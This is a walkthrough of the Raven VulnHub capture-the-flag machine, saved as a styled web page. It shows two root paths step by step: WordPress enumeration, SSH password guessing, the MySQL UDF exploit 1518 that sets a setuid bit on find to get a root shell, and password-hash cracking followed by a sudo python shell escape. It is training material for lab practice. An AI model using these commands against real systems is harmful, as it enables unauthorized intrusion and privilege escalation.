@@ -1,0 +1,132 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Raven: Walkthrough (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-11-09T18:52:06+00:00">November 9, 2018</time><time class="updated" datetime="2025-06-10T20:29:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello everyone and welcome to yet another CTF challenge walkthrough. This time we’ll be putting our hands on Raven. Raven is a Beginner/Intermediate boot2root machine. There are two intended ways of getting root and we demonstrate both of the ways in this article.</span></p>
+<h3><span style="color: #800000;"><strong>Table of Contents: (Method 1)</strong></span></h3>
+<ol>
+<li><span style="color: #000000;">Port scanning and IP discovery.</span></li>
+<li><span style="color: #000000;">Hitting on port 80 and the discovery of WordPress CMS.</span></li>
+<li><span style="color: #000000;">WPScanning the website to discover two users.</span></li>
+<li><span style="color: #000000;">Hitting and brute forcing port 22.</span></li>
+<li><span style="color: #000000;">Enumerating the active processes using LinEnum script.</span></li>
+<li><span style="color: #000000;">Discovery of MySQL.</span></li>
+<li><span style="color: #000000;">Fetching the database username and password from wp-config.php.</span></li>
+<li><span style="color: #000000;">Using MySQL to create a UDF (user-defined function) dynamic library.</span></li>
+<li><span style="color: #000000;">Compiling UDF exploit to a shared library program.</span></li>
+<li><span style="color: #000000;">Running a UDF library program into the victim’s machine.</span></li>
+<li><span style="color: #000000;">Setting sticky bit on “find”.</span></li>
+<li><span style="color: #000000;">Getting root access.</span></li>
+<li><span style="color: #000000;">Reading the flags.</span></li>
+</ol>
+<h3><span style="color: #800000;"><strong>Table of Contents: (Method 2)</strong></span></h3>
+<ol>
+<li><span style="color: #000000;">Getting shell to the victim and accessing MySQL the same way till step 7 in method 1.</span></li>
+<li><span style="color: #000000;">In the MySQL shell, discovering all the databases and tables.</span></li>
+<li><span style="color: #000000;">Reading table wp_users from the database WordPress.</span></li>
+<li><span style="color: #000000;">Fetching hashes from the table wp_users.</span></li>
+<li><span style="color: #000000;">Cracking the hash to get a shell to the other user.</span></li>
+<li><span style="color: #000000;">Discovering python has no root required to run.</span></li>
+<li><span style="color: #000000;">Spawning root TTY using python one-liner.</span></li>
+<li><span style="color: #000000;">Reading the flags.</span></li>
+</ol>
+<p><span style="color: #000000;">Let’s get started then!</span></p>
+<p><span style="color: #000000;">Discovering the active devices on a network using <strong>netdiscover</strong> and getting the IP address of our victim machine. In this case, the IP address holds 192.168.1.102</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-qwSzwuvvsDk/W-XTwbwHNBI/AAAAAAAAa_E/R7viZv-QjwoDUKXH3LMrCq_zvokR6d7JQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Using nmap on the victim machine we got three ports open 22,80 and 111</span></p>
+<pre class="lang:default decode:true ">nmap -A 192.168.1.102</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Ckk7ptq3Oqs/W-XTzylm9dI/AAAAAAAAa_s/8_b-6gKwBT8xALHPSdjVGpWjZS7AssNGACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">So we instantly moved to port 80 and discovered a website of Raven Security.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-O9urAmIh8T8/W-XT0Fp1ZYI/AAAAAAAAa_w/NmR7q9DOr5g8Xo9WgTKoUEUGhpD0jwF2QCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">On the top right, we found a tab saying “blog” and moved to the webpage only to discover that the victim’s machine had WordPress CMS installed!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-orzvH1IBjEA/W-XT0rWMxRI/AAAAAAAAa_0/0LVMlpxop0EGp4eDq6WmN0oq3eCDtXZxwCLcBGAs/s1600/4.1.png"/></span></p>
+<p><span style="color: #000000;">So, the first idea that came to us was to run a wpscan on the webpage and see what the scan enumerates.</span></p>
+<pre class="lang:default decode:true">wpscan --url http://192.168.1.102/wordpress/ --wp-content-dir -ep -et -eu</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y8HPN5ZS75A/W-XT0wsLORI/AAAAAAAAa_4/XLv_bg2yEZk-AdT_ydLuyIUHLapPYfr3QCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">The results returned 2 valuable users made on the victim’s machine:</span></p>
+<p><span style="color: #000000;"><strong>Michael</strong> and <strong>Steven</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-V04DH6atFZQ/W-XT1IqKu2I/AAAAAAAAa_8/nnm6lS9XVIAUQoeZH0qFjOAys-TsR58VgCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Now, to proceed further in the same port was seeing blurry to the eye so we tried hitting port 22 (SSH).</span></p>
+<p><span style="color: #000000;">It is a fairly logical “hit and try” method to use the same word as both the username and password too.</span></p>
+<p><span style="color: #000000;">We logged in to SSH with “<strong>michael</strong>” as the username and “<strong>michael</strong>” and got into the shell successfully!</span></p>
+<p><span style="color: #000000;">Then we changed the active directory to /tmp and imported <strong>LinEnum.sh, </strong>a script to enumerate many of the basic and advanced Linux details.</span></p>
+<p><span style="color: #000000;">It was hosted in a folder on our local machine and was imported into the victim machine using wget command.</span></p>
+<p><span style="color: #000000;">My local IP address was 192.168.1.109 in this case.</span></p>
+<pre class="lang:default decode:true">ssh michael@192.168.1.102
+cd /tmp
+wget http://192.168.1.109/LinEnum.sh
+chmod 777 LinEnum.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BrJnZounUtM/W-XT2MOfToI/AAAAAAAAbAA/8FZA5qOLksEOz5MyvUntzdH6gGuOwW-UQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">After changing the permissions of the file to executable we ran the script only to find that MySQL service was running (port 3306 is evident to that).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nsAvY28dLBQ/W-XT2gfZf5I/AAAAAAAAbAE/GVTbK9KZ3MwdXGlHjRc4TpAWGtoE48NiQCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We found a <strong>MySQL-Exploit-Remote-Root-Code-Execution-Privesc </strong>vulnerability! (FOR MORE INFO: <a style="color: #000000;" href="https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html">https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html</a>)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZrkyWH_3a3I/W-XT2w8lcqI/AAAAAAAAbAI/gGX6jCVYOzcCmyxawzypBEpirmACzmDeACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">So, we changed the current directory to /var/www/html/wordpress and searched for the wp-config file, since it will have the password to the MySQL database.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-gymfOdp0ukI/W-XT3JmHljI/AAAAAAAAbAM/I4MiQLOwhtorYOuB93oeLN0Dorqq_SljQCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">The password was found to be:</span></p>
+<pre class="lang:default decode:true">R@v3nSecurity</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-N2Xb4hvgBgI/W-XTwqx0ZpI/AAAAAAAAa_I/znKKiLMM7xgo3waGPJaQEyTHkwnpCOZtACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">So, we searched for a UDF dynamic library exploit and it was named “1518.c” in the exploit database.</span></p>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.exploit-db.com/exploits/1518/">https://www.exploit-db.com/exploits/1518/</a></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kCvyk39gt24/W-XTw7pxY-I/AAAAAAAAa_M/RD8rz_Sr67g_akDVOV6X2sjGbaTdx1UxwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">The exploits run by compiling the raw C code to “<strong>.so”</strong> file and then transferring it to the victim machine and exploiting MySQL vulnerability.</span></p>
+<p><span style="color: #000000;">The first step was to compile it.</span></p>
+<pre class="lang:default decode:true">searchsploit –m 1518.c
+gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--TTgkP72llM/W-XTxSshgRI/AAAAAAAAa_Q/BHEIrEwRoSUNeyGdFW4c432YAhhNdOziwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">We then fired up a local server and transferred this 1518.so file to the victim’s /tmp directory since it is universally readable and writable using the wget command.</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.109/1518.so
+chmod 777 1518.so
+mysql –u root –p</pre>
+<p><span style="color: #000000;"><strong>&lt;entered password&gt;</strong></span></p>
+<p><span style="color: #000000;">After getting a MySQL shell, we started exploiting it using the vulnerability we just found</span></p>
+<pre class="lang:default decode:true">use mysql;</pre>
+<p><span style="color: #000000;">Now, we created a table called “foo”</span></p>
+<p><span style="color: #000000;">In this table, we inserted the link to 1518.so file we just imported from the local machine to /tmp directory.</span></p>
+<p><span style="color: #000000;">We dumped the same file to /usr/lib/mysql/plugin/ directory (since it was vulnerable)</span></p>
+<p><span style="color: #000000;">In the most important step, we created a UDF function named do_system, that will invoke the code that implements the function.</span></p>
+<p><span style="color: #000000;">Hence, we are invoking the code “chmod u+s /usr/bin/find” to set the sticky bit on “find”</span></p>
+<pre class="lang:default decode:true">create table foo(line blob);
+insert into foo values(load_file('/tmp/1518.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
+create function do_system returns integer soname '1518.so';
+select do_system('chmod u+s /usr/bin/find');</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6w3l0g95O1M/W-XTxkf0QSI/AAAAAAAAa_U/Qb4AaFEBdXESo5luVl_8rsQtmy2LNp6aACLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Now we traversed back to the directory /tmp and executed commands using the find utility.</span></p>
+<pre class="lang:default decode:true">touch raj
+find raj –exec "whoami" \;
+find raj –exec "/bin/sh" \;
+cd /root
+ls
+cat flag4.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0nEnMEZ7HJM/W-XTxwgJEwI/AAAAAAAAa_Y/hTS79wU1HPY3Lt5dlLtyxxd8XWMvkz9MgCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">But since the task is also to capture all the flags we found it using the command:</span></p>
+<pre class="lang:default decode:true">find / -name "flag*.txt"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DKHDmdlVVD4/W-XTyWv1liI/AAAAAAAAa_c/ZbSmqm9ZcF8418UnkSmwP14Cl485nnwSwCLcBGAs/s1600/15.png"/></span></p>
+<h3><span style="color: #800000;">Second Method</span></h3>
+<p><span style="color: #000000;">Reach to the MySQL shell as above and then follow the alternate approach.</span></p>
+<p><span style="color: #000000;">See all the databases and dump the usernames from the wp_users table in the database “WordPress”</span></p>
+<pre class="lang:default decode:true">show databases;
+use wordpress;
+show tables;
+select * from wp_users;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-77PtZGIAOQA/W-XTymVUYbI/AAAAAAAAa_g/yXlD3IugHGUsfqBW5nCqkNB-CAZm48oFwCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">We found two hashes but since we already know the password to Michael, we cracked Steven’s password using John the Ripper by pasting the hash into a text file called “hash.”</span></p>
+<p><span style="color: #000000;">The password was found to be: <strong>pink84</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-V35CIafnh90/W-XTy1USQ8I/AAAAAAAAa_k/ie4m_ueNuMQDq0Tj8xP8bYJiV406ejt1QCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Logging into steven’s shell and running sudo -l command we found that Python required no root permission to run.</span></p>
+<p><span style="color: #000000;">So, we spawned a python teletype (PTY) using python’s one-liner.</span></p>
+<pre class="lang:default decode:true">su steven
+sudo –l
+sudo python –c 'import pty;pty.spawn("/bin/bash")'
+id</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cUTgTvAiRko/W-XTzeMnuDI/AAAAAAAAa_o/2vZXLXkyyHYMuMky8d9F1h0KXOX9jyA2wCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">So, here it is! Two ways to root Raven. Hope you found this article useful.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
